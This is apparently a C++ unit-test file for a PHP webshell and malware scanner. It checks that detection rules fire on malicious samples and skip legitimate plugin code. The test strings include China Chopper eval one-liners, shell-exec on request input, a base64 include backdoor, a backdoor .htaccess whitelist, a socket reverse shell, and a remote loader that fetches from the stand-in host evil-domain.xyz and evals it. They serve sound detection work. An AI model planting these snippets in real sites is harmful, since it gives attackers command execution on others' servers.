#include <gtest/gtest.h>
#include "rules/Registry.hpp"
#include "config/Types.h"
#include "core/MatchEngine.h"

using namespace lyxbosa::rules;
using namespace lyxbosa;

// ============================================================================
// RuleCode Tests
// ============================================================================

TEST(RuleCodeTest, ParseValidCode) {
    auto code = RuleCode::parse("WS001");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::Webshell);
    EXPECT_EQ(code->number, 1);
}

TEST(RuleCodeTest, ParseCodeWithLargerNumber) {
    auto code = RuleCode::parse("RCE123");
    ASSERT_TRUE(code.has_value());
    EXPECT_EQ(code->category, Category::CodeExec);
    EXPECT_EQ(code->number, 123);
}

TEST(RuleCodeTest, ParseInvalidCode) {
    EXPECT_FALSE(RuleCode::parse("INVALID001").has_value());
    EXPECT_FALSE(RuleCode::parse("WS").has_value());
    EXPECT_FALSE(RuleCode::parse("123").has_value());
    EXPECT_FALSE(RuleCode::parse("").has_value());
}

TEST(RuleCodeTest, ToString) {
    RuleCode code{Category::Webshell, 1};
    EXPECT_EQ(code.toString(), "WS001");

    RuleCode code2{Category::CodeExec, 99};
    EXPECT_EQ(code2.toString(), "RCE099");
}

// ============================================================================
// Category Tests
// ============================================================================

TEST(CategoryTest, ParseCategory) {
    EXPECT_EQ(parseCategory("WS"), Category::Webshell);
    EXPECT_EQ(parseCategory("RCE"), Category::CodeExec);
    EXPECT_EQ(parseCategory("OBF"), Category::Obfuscation);
    EXPECT_FALSE(parseCategory("INVALID").has_value());
}

TEST(CategoryTest, CategoryInfo) {
    const auto& info = getCategoryInfo(Category::Webshell);
    EXPECT_EQ(info.code, "WS");
    EXPECT_EQ(info.name, "Webshell");
}

// ============================================================================
// Registry Tests
// ============================================================================

TEST(RegistryTest, GetRuleByCode) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);
    EXPECT_EQ(rule->name, "China Chopper webshell");
    EXPECT_EQ(rule->severity, Severity::Critical);
}

TEST(RegistryTest, GetRuleByInvalidCode) {
    auto* rule = getRuleByCode("INVALID999");
    EXPECT_EQ(rule, nullptr);
}

TEST(RegistryTest, GetRulesByCategory) {
    auto rules = getRulesByCategory(Category::Webshell);
    EXPECT_GT(rules.size(), 0);

    for (const auto* rule : rules) {
        EXPECT_EQ(rule->code.category, Category::Webshell);
    }
}

TEST(RegistryTest, GetAllRules) {
    const auto& allRules = getAllBuiltinRules();
    EXPECT_GT(allRules.size(), 0);
}

// ============================================================================
// Pattern Matching Tests - China Chopper (WS001)
// ============================================================================

TEST(WebshellTest, ChinaChopperMatches) {
    auto* rule = getRuleByCode("WS001");
    ASSERT_NE(rule, nullptr);

    // China Chopper patterns - direct eval/assert of POST data
    const char* sample1 = R"(<?php @eval($_POST['pass']);?>)";
    const char* sample2 = R"(<?php @eval ( $_POST [ 'x' ] ); ?>)";
    const char* sample3 = R"(<?php assert($_POST['cmd']);?>)";

    EXPECT_TRUE(rule->matches(sample1));
    EXPECT_TRUE(rule->matches(sample2));
    EXPECT_TRUE(rule->matches(sample3));

    auto results = rule->findMatches(sample1);
    EXPECT_GT(results.size(), 0);
}

TEST(WebshellTest, ChinaChopperZ0Param) {
    // WS002 is the z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("$_POST['z0']"));
    EXPECT_TRUE(rule->matches("$_REQUEST['z0']"));
}

TEST(WebshellTest, ChinaChopperNoFalsePositive) {
    // WS002 tests z0 param - normal params should NOT match
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    // Normal POST access should NOT match
    EXPECT_FALSE(rule->matches("$_POST['username']"));
    EXPECT_FALSE(rule->matches("$_POST['password']"));
}

// ============================================================================
// Pattern Matching Tests - Simple Backdoor patterns
// ============================================================================

TEST(WebshellTest, WSOWebshellMatches) {
    auto* rule = getRuleByCode("WS004");  // WSO webshell
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("WSO 2.0"));
    EXPECT_TRUE(rule->matches("Web Shell by oRb"));
}

// ============================================================================
// Pattern Matching Tests - Code Execution (RCE)
// ============================================================================

TEST(CodeExecTest, EvalBase64Matches) {
    auto* rule = getRuleByCode("RCE001");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(base64_decode($x));"));
    EXPECT_TRUE(rule->matches("eval( base64_decode( $data ) );"));
}

TEST(CodeExecTest, EvalGzinflateMatches) {
    auto* rule = getRuleByCode("RCE002");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("eval(gzinflate(base64_decode($x)));"));
    EXPECT_TRUE(rule->matches("eval( gzinflate( $data ));"));
}

TEST(CodeExecTest, DynamicEvalMatches) {
    // RCE003 is dynamic function with user input - $var($_GET[...])
    // Pattern requires statement boundary (newline, semicolon, etc.) before $var
    // This excludes method calls like $this->$method($_GET[...])
    auto* rule = getRuleByCode("RCE003");
    ASSERT_NE(rule, nullptr);

    // Realistic test cases with statement context
    EXPECT_TRUE(rule->matches("<?php\n$func($_POST['code']);"));
    EXPECT_TRUE(rule->matches("some_call(); $handler($_GET['x']);"));

    // Should NOT match method calls
    EXPECT_FALSE(rule->matches("$this->$method($_GET['ID']);"));
}

TEST(CodeExecTest, ShellExecMatches) {
    // RCE008 is shell_exec/system/passthru with user input
    auto* rule = getRuleByCode("RCE008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("shell_exec($_GET['cmd']);"));
    EXPECT_TRUE(rule->matches("passthru($_POST['c']);"));
    EXPECT_TRUE(rule->matches("system($_REQUEST['x']);"));
}

// ============================================================================
// False Positive Tests - Legitimate Code Should NOT Match
// ============================================================================

TEST(FalsePositiveTest, LegitimateUploadHandler) {
    // WS008 is malicious upload handler - user-controlled destination
    auto* rule = getRuleByCode("WS008");
    ASSERT_NE(rule, nullptr);

    // This is legitimate - destination is NOT from user input
    const char* legitimate = R"(
        move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $filename);
    )";

    EXPECT_FALSE(rule->matches(legitimate));
}

TEST(FalsePositiveTest, LegitimateEval) {
    auto* rule = getRuleByCode("RCE003");  // Dynamic eval
    ASSERT_NE(rule, nullptr);

    // eval with hardcoded string - NOT user input
    const char* legitimate = "eval('return 1 + 1;');";

    EXPECT_FALSE(rule->matches(legitimate));
}

// ============================================================================
// Match Position Tests
// ============================================================================

TEST(MatchPositionTest, SingleLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php $_POST['z0']; ?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 1);
    EXPECT_GT(results[0].column, 0);
}

TEST(MatchPositionTest, MultiLinePosition) {
    // WS002 is z0 parameter rule
    auto* rule = getRuleByCode("WS002");
    ASSERT_NE(rule, nullptr);

    const char* code = "<?php\n// comment\n$_POST['z0'];\n?>";
    auto results = rule->findMatches(code);

    ASSERT_GT(results.size(), 0);
    EXPECT_EQ(results[0].line, 3);  // Should be on line 3
}

// ============================================================================
// Dropper Rule Tests (DRP)
// ============================================================================

TEST(DropperTest, DRP007_LargeBase64Staging) {
    auto* rule = getRuleByCode("DRP007");
    ASSERT_NE(rule, nullptr);

    // Generate a string with 600+ base64 characters
    std::string base64_chars;
    for (int i = 0; i < 600; i++) base64_chars += "A";

    std::string malicious = "$data = base64_decode(\"" + base64_chars + "\");";
    EXPECT_TRUE(rule->matches(malicious)) << "DRP007 should match large base64 in variable";

    // Should NOT match small base64 strings
    EXPECT_FALSE(rule->matches("$x = base64_decode(\"SGVsbG8=\");"));

    // Test findMatches (used by scanner)
    auto results = rule->findMatches(malicious);
    EXPECT_GT(results.size(), 0) << "DRP007 findMatches should return results";
}

TEST(DropperTest, DRP008_ArchiveDropper) {
    auto* rule = getRuleByCode("DRP008");
    ASSERT_NE(rule, nullptr);

    EXPECT_TRUE(rule->matches("file_put_contents(\"malware.zip\", $data);"));
    EXPECT_TRUE(rule->matches("file_put_contents('backdoor.tar.gz', $content);"));
    EXPECT_FALSE(rule->matches("file_put_contents(\"config.php\", $data);"));
}

// ============================================================================
// Backdoor Tests
// ============================================================================

TEST(BackdoorTest, BD016_Base64IncludeBackdoor) {
    auto* rule = getRuleByCode("BD016");
    ASSERT_NE(rule, nullptr);

    // Real-world WordPress template injection (exact pattern from the wild)
    EXPECT_TRUE(rule->matches(
        R"(<?php @include base64_decode("L3Zhci93d3cvdmhvc3RzL3dpem5ldC5nci9jdWx0cmFkaW8uZ3I=");?>)"));

    // With parentheses around include argument
    EXPECT_TRUE(rule->matches(
        R"(<?php @include(base64_decode("L3Zhci93d3cv"));?>)"));

    // include_once variant
    EXPECT_TRUE(rule->matches(
        R"(@include_once base64_decode("L3Zhci93d3cv");)"));

    // require variant
    EXPECT_TRUE(rule->matches(
        R"(@require base64_decode("L3Zhci93d3cv");)"));

    // require_once variant
    EXPECT_TRUE(rule->matches(
        R"(@require_once(base64_decode("L3Zhci93d3cv"));)"));

    // Without @ suppressor (still malicious)
    EXPECT_TRUE(rule->matches(
        R"(include base64_decode("L3Zhci93d3cv");)"));

    // With spaces between @ and include
    EXPECT_TRUE(rule->matches(
        R"(@ include base64_decode("L3Zhci93d3cv");)"));

    // False positives: legitimate base64_decode usage (not with include/require)
    EXPECT_FALSE(rule->matches(
        R"($data = base64_decode("SGVsbG8gV29ybGQ=");)"));
    EXPECT_FALSE(rule->matches(
        R"(echo base64_decode($encoded);)"));
    EXPECT_FALSE(rule->matches(
        R"(file_put_contents($path, base64_decode($data));)"));
}

TEST(BackdoorTest, BD017_HtaccessBackdoorWhitelist) {
    auto* rule = getRuleByCode("BD017");
    ASSERT_NE(rule, nullptr);

    // Real-world malicious .htaccess: deny all PHP, whitelist backdoor scripts
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \".(py|exe|php)$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"
        "<FilesMatch \"^(lock360.php|wp-l0gin.php|wp-the1me.php|wp-scr1pts.php|radio.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known backdoor name in FilesMatch (leet-speak)
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(wp-l0gin.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // Known shell name in FilesMatch
    EXPECT_TRUE(rule->matches(
        "<FilesMatch \"^(c99.php|r57.php)$\">\n"
        "Order allow,deny\n"
        "Allow from all\n"
        "</FilesMatch>\n"));

    // False positive: legitimate FilesMatch for security (blocking PHP uploads)
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.php$\">\n"
        "Order allow,deny\n"
        "Deny from all\n"
        "</FilesMatch>\n"));

    // False positive: normal FilesMatch for caching
    EXPECT_FALSE(rule->matches(
        "<FilesMatch \"\\.(css|js|png|jpg)$\">\n"
        "Header set Cache-Control \"max-age=604800\"\n"
        "</FilesMatch>\n"));
}

// ============================================================================
// Context Filter Tests - False Positive Reduction
// These test the MatchEngine's context-aware filtering via full match() calls
// ============================================================================

class ContextFilterTest : public ::testing::Test {
protected:
    lyxbosa::MatchEngine engine;

    void SetUp() override {
        engine.loadAllBuiltinRules();
    }

    // Helper: check if a specific rule code produced matches
    bool hasMatchForRule(const std::vector<lyxbosa::FileMatch>& matches, const std::string& ruleCode) {
        for (const auto& m : matches) {
            if (m.category == ruleCode) return true;
        }
        return false;
    }
};

// BD005: Should skip Monolog CubeHandler (vendor-prefixed path)
TEST_F(ContextFilterTest, BD005_SkipsMonologCubeHandler) {
    // Simulated Monolog CubeHandler content with socket_create + exec elsewhere
    const char* content =
        "<?php\n"
        "namespace Monolog\\Handler;\n"
        "class CubeHandler extends AbstractHandler {\n"
        "    private function connectUdp(): void {\n"
        "        $udpConnection = socket_create(AF_INET, SOCK_DGRAM, 0);\n"
        "        if (false === $udpConnection) {\n"
        "            throw new \\RuntimeException('Could not create socket');\n"
        "        }\n"
        "    }\n"
        "    protected function exec($cmd) { return $cmd; }\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/the-events-calendar/common/vendor-prefixed/monolog/monolog/src/Monolog/Handler/CubeHandler.php");
    EXPECT_FALSE(hasMatchForRule(matches, "BD005"))
        << "BD005 should be filtered out for Monolog CubeHandler";
}

// BD005: Should still detect real socket backdoors
TEST_F(ContextFilterTest, BD005_DetectsRealSocketBackdoor) {
    const char* content =
        "<?php\n"
        "$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n"
        "socket_connect($sock, $_GET['ip'], $_GET['port']);\n"
        "while($cmd = socket_read($sock, 2048)) {\n"
        "    $out = shell_exec($cmd);\n"
        "    socket_write($sock, $out);\n"
        "}\n";

    auto matches = engine.match(content, "wp-content/uploads/backdoor.php");
    EXPECT_TRUE(hasMatchForRule(matches, "BD005"))
        << "BD005 should detect real socket backdoor";
}

// OBF011: Should skip WPBakery rawurldecode(base64_decode(...))
TEST_F(ContextFilterTest, OBF011_SkipsWPBakeryJsComposer) {
    const char* content =
        "<?php\n"
        "function vc_value_from_safe($value) {\n"
        "    return rawurldecode(base64_decode(strip_tags($value)));\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/js_composer/include/helpers/helpers_factory.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out for WPBakery js_composer";
}

// OBF011: Should skip when htmlentities context (display code)
TEST_F(ContextFilterTest, OBF011_SkipsHtmlentitiesContext) {
    const char* content =
        "<?php\n"
        "$output = htmlentities(rawurldecode(base64_decode($value)), ENT_COMPAT, 'UTF-8');\n";

    auto matches = engine.match(content,
        "wp-content/themes/mytheme/functions.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should be filtered out when htmlentities is on the same line";
}

// OBF011: Should still detect suspicious rawurldecode+base64 outside builders
TEST_F(ContextFilterTest, OBF011_DetectsSuspiciousUsage) {
    const char* content =
        "<?php\n"
        "$payload = rawurldecode(base64_decode($_POST['data']));\n"
        "eval($payload);\n";

    auto matches = engine.match(content, "wp-content/uploads/cache.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF011"))
        << "OBF011 should detect suspicious rawurldecode+base64 in unknown files";
}

// OBF010: Should skip RevSlider compressed data import
TEST_F(ContextFilterTest, OBF010_SkipsRevSliderDataImport) {
    const char* content =
        "<?php\n"
        "function import_slider_data($data) {\n"
        "    $data = gzuncompress(base64_decode($data));\n"
        "    $_data = json_decode($data, true);\n"
        "    return (!empty($_data)) ? $_data : false;\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/functions.class.php");
    EXPECT_FALSE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should be filtered out for RevSlider data import";
}

// OBF010: Should still detect malicious gzuncompress+base64
TEST_F(ContextFilterTest, OBF010_DetectsMaliciousUsage) {
    const char* content =
        "<?php\n"
        "$code = gzuncompress(base64_decode($encoded));\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/tmp.php");
    EXPECT_TRUE(hasMatchForRule(matches, "OBF010"))
        << "OBF010 should detect malicious gzuncompress+base64 in unknown paths";
}

// DRP001: Should skip googleapis.com URL
TEST_F(ContextFilterTest, DRP001_SkipsGoogleApisUrl) {
    const char* content =
        "<?php\n"
        "$list_raw = file_get_contents('https://www.googleapis.com/webfonts/v1/webfonts?sort=popularity');\n"
        "// ... many lines of code ...\n"
        "function some_other_function() {\n"
        "    eval($template);\n"
        "}\n";

    auto matches = engine.match(content,
        "wp-content/plugins/revslider/includes/googlefonts.php");
    EXPECT_FALSE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should be filtered out for googleapis.com URL";
}

// DRP001: Should still detect real remote code loaders
TEST_F(ContextFilterTest, DRP001_DetectsRealRemoteLoader) {
    const char* content =
        "<?php\n"
        "$code = file_get_contents('https://evil-domain.xyz/payload.txt');\n"
        "eval($code);\n";

    auto matches = engine.match(content, "wp-content/uploads/loader.php");
    EXPECT_TRUE(hasMatchForRule(matches, "DRP001"))
        << "DRP001 should detect real remote code loaders";
}
